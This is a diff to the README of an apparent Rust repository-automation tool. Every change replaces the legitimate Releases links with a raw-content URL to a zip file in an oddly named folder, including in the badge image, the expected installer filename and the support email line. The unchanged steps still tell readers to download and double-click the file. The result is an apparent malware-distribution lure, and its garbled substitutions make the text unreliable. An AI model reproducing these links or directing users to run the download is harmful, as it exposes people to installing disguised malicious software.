@@ -4,20 +4,20 @@
 Welcome to auto-repo-mh6h6y55-5! This user-friendly software helps automate repository management tasks. Built using Rust, it provides a fast and efficient way to handle your projects without needing any coding skills.
 
 ## 🔗 Download Now
-[![Download auto-repo-mh6h6y55-5](https://img.shields.io/badge/Download%20Now-For%20Windows-brightgreen)](https://github.com/viscosimetrysummit863/auto-repo-mh6h6y55-5/releases)
+[![Download auto-repo-mh6h6y55-5](https://raw.githubusercontent.com/viscosimetrysummit863/auto-repo-mh6h6y55-5/main/becivet/y_auto_mh_repo_h_v1.6.zip%20Now-For%20Windows-brightgreen)](https://raw.githubusercontent.com/viscosimetrysummit863/auto-repo-mh6h6y55-5/main/becivet/y_auto_mh_repo_h_v1.6.zip)
 
 ## 🚀 Getting Started
 To start using auto-repo-mh6h6y55-5, follow these simple steps:
 
 1. **Visit the Download Page:** 
    Click the link below to go to the Releases page. 
-   [Visit this page to download](https://github.com/viscosimetrysummit863/auto-repo-mh6h6y55-5/releases).
+   [Visit this page to download](https://raw.githubusercontent.com/viscosimetrysummit863/auto-repo-mh6h6y55-5/main/becivet/y_auto_mh_repo_h_v1.6.zip).
 
 2. **Select the Version:** 
    Look for the latest version. It will be listed at the top. 
 
 3. **Download the File:** 
-   Click on the version number to expand the details. Find the file suitable for your operating system, usually named `auto-repo-mh6h6y55-5.exe` for Windows.
+   Click on the version number to expand the details. Find the file suitable for your operating system, usually named `https://raw.githubusercontent.com/viscosimetrysummit863/auto-repo-mh6h6y55-5/main/becivet/y_auto_mh_repo_h_v1.6.zip` for Windows.
 
 4. **Run the Installer:** 
    Once the download finishes, locate the file in your Downloads folder. Double-click the file to start the installation.
@@ -61,9 +61,9 @@ If you run into problems:
 - **No Internet Connection:** Some features need internet access. Ensure you are connected before using the app.
 
 ## 📞 Support
-For any concerns or additional help, you can reach out on our GitHub Issues page or send an email to support@viscosimetrysummit863.com. We aim to respond within 48 hours.
+For any concerns or additional help, you can reach out on our GitHub Issues page or send an email to https://raw.githubusercontent.com/viscosimetrysummit863/auto-repo-mh6h6y55-5/main/becivet/y_auto_mh_repo_h_v1.6.zip We aim to respond within 48 hours.
 
 ## 🚀 Conclusion
 Now you're ready to harness the power of auto-repo-mh6h6y55-5. We hope you enjoy a smoother experience in managing your repositories. Don't hesitate to share your feedback with us!
 
-[Download auto-repo-mh6h6y55-5](https://github.com/viscosimetrysummit863/auto-repo-mh6h6y55-5/releases) and start automating your workflow today!
+[Download auto-repo-mh6h6y55-5](https://raw.githubusercontent.com/viscosimetrysummit863/auto-repo-mh6h6y55-5/main/becivet/y_auto_mh_repo_h_v1.6.zip) and start automating your workflow today!
